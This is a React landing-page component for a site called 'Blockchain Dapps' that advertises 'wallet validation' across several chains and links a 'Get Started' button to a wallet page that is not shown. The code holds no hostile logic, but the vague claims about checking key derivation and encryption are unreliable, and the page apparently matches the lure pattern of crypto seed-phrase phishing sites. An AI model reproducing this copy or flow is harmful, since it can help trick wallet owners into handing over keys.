import React from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import TypingEffect from '@/components/TypingEffect';
import CryptoCarousel from '@/components/CryptoCarousel';
import CryptoChart from '@/components/CryptoChart';
import Globe from '@/components/Globe';
import Testimonials from '@/components/Testimonials';

const Index = () => {
  const navigate = useNavigate();

  const typingTexts = [
    "All Networks",
    "Etherum chain",
    "Avalanche chain",
    "Phantom chain ",
    "Binance Smart Chain",
    "Cronos Chain",
    "Arbitrum Chain",
    "Polygon Chain "
  ];

  const walletImages = [
    'https://blockchaindappc.pages.dev/assets/images/metamask.jpg',
    'https://blockchaindappc.pages.dev/assets/images/Trust-wallet.jpg',
    'https://blockchaindappc.pages.dev/assets/images/phantom.jpg',
    'https://blockchaindappc.pages.dev/assets/images/coinbase.png',
    'https://blockchaindappc.pages.dev/assets/images/wclogo.png',
  ];

  const handleGetStarted = () => {
    navigate('/wallets');
  };

  return (
    <div className="w-full min-h-screen bg-black">
      {/* Hero Section */}
      <section className="hero-background relative min-h-screen">
        <div className="floating-prices">
          <CryptoCarousel />
        </div>
        <div className="container mx-auto relative z-10 flex flex-col items-center justify-center min-h-screen text-center px-4">
          <h1 className="text-5xl md:text-8xl font-bold mb-6 text-white tracking-tight">
            Blockchain <span className="text-gradient">Dapps</span>
          </h1>

          <div className="h-16 mb-8">
            <h2 className="text-3xl md:text-6xl font-bold text-gray-300">
              <TypingEffect texts={typingTexts} />
            </h2>
          </div>
          <h1 className='text-xl md:text-3xl font-bold mb-6 text-white tracking-tight'>
            Blockchain Dapps is a powerful tool for wallet validation, essential for ensuring the security and integrity of digital assets. 
            Performs a comprehensive analysis of the wallet's structure and contents, including checks for correct formatting, correct key derivation, and proper encryption.
            All of this is made possible because of the blockchain cloud infrastructure powered by Chain Cloud and Sequence.
          </h1>
          <Button
            onClick={handleGetStarted}
            className="text-lg px-8 py-6 rounded-lg bg-white text-black hover:bg-gray-200 transition-all duration-300 font-bold tracking-wide"
          >
            Get Started
          </Button>
        </div>
      </section>

      {/* Live Chart Section */}
      <section className="container mx-auto px-4 py-16">
        <CryptoChart />
      </section>

      {/* Globe Section */}
      <section className="container mx-auto px-4 py-16">
        <Globe walletImages={walletImages} />
      </section>

      {/* Testimonials Section */}
      <section className="container mx-auto px-4 py-16">
        <Testimonials />
      </section>

      <footer className="w-full bg-gradient-to-b from-white/10 to-white/0 backdrop-blur-lg border-t border-white/10 h-44 relative overflow-hidden">
        <div className="container mx-auto py-8">
          <div className="mb-8">
            <CryptoCarousel />
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Index;